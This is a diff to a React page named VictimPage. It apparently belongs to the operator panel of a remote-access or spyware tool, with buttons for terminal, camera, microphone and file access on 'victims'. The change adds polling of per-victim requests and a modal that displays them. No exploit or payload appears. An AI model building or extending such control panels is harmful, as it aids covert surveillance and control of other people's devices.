@@ -3,6 +3,7 @@ import { useParams, Link } from 'react-router-dom';
 import { fetchVictims } from '../utils/api';
 import ActionButton from './ActionButton';
 import Sidebar from './Sidebar';
+import RequestModal from './RequestModal';
 import { Terminal, Camera, Mic, FileText, History } from 'lucide-react';
 
 const buttons = [
@@ -16,6 +17,9 @@ const buttons = [
 export default function VictimPage() {
   const { _id } = useParams();
   const [victim, setVictim] = useState(null);
+  const [requests, setRequests] = useState([]);
+  const [selectedRequest, setSelectedRequest] = useState(null);
+  const [isModalOpen, setIsModalOpen] = useState(false);
 
   const fetchAndUpdateVictim = () => {
     fetchVictims().then(victims => {
@@ -24,15 +28,41 @@ export default function VictimPage() {
     });
   };
 
-  useEffect(() => {
-    fetchAndUpdateVictim();
+  const fetchRequests = async () => {
+    try {
+      const response = await fetch(`http://localhost:3001/api/client/requests/${_id}`);
+      if (!response.ok) {
+        throw new Error('Failed to fetch requests');
+      }
+      const data = await response.json();
+      setRequests(data);
+    } catch (error) {
+      console.error('Error fetching requests:', error);
+    }
+  };
 
-    const interval = setInterval(() => {
-      fetchAndUpdateVictim();
-    }, 10 * 1000);
+  const updateData = () => {
+    fetchAndUpdateVictim();
+    fetchRequests();
+  };
+
+  useEffect(() => {
+    updateData();
+
+    const interval = setInterval(updateData, 10 * 1000);
 
     return () => clearInterval(interval);
   }, [_id]);
+
+  const handleRequestClick = (request) => {
+    setSelectedRequest(request);
+    setIsModalOpen(true);
+  };
+
+  const closeModal = () => {
+    setIsModalOpen(false);
+    setSelectedRequest(null);
+  };
 
   if (!victim) {
     return <div className='bg-gray-900'>Victim not found!</div>;
@@ -46,7 +76,7 @@ export default function VictimPage() {
 
   return (
     <div className="flex min-h-screen bg-gray-900 text-white">
-      <div className="flex-grow p-4 sm:p-6 md:p-8">
+      <div className="flex-grow p-4 sm:p-6 md:p-8 overflow-y-auto">
         <h1 className="text-2xl sm:text-3xl font-bold mb-6 text-center">{victim.title}</h1>
         <div className="w-full h-96 bg-gray-800 rounded-lg shadow-md mb-6 flex items-center justify-center overflow-hidden">
           <img src={victim.img} alt={victim.title} className="w-full h-full object-cover" />
@@ -66,13 +96,16 @@ export default function VictimPage() {
           ))}
         </div>
 
-        <Link to="/" className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300 ease-in-out">
+        <Link to="/" className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300 ease-in-out inline-block mb-8">
           Back to Dashboard
         </Link>
       </div>
-      <div className="w-1/3 min-w-[300px] max-w-[400px]">
-        <Sidebar />
+      <div className="w-1/3 min-w-[300px] max-w-[400px] h-screen overflow-hidden">
+        <Sidebar victim={victim} requests={requests} onRequestClick={handleRequestClick} />
       </div>
+      {isModalOpen && selectedRequest && (
+        <RequestModal request={selectedRequest} onClose={closeModal} />
+      )}
     </div>
   );
 }
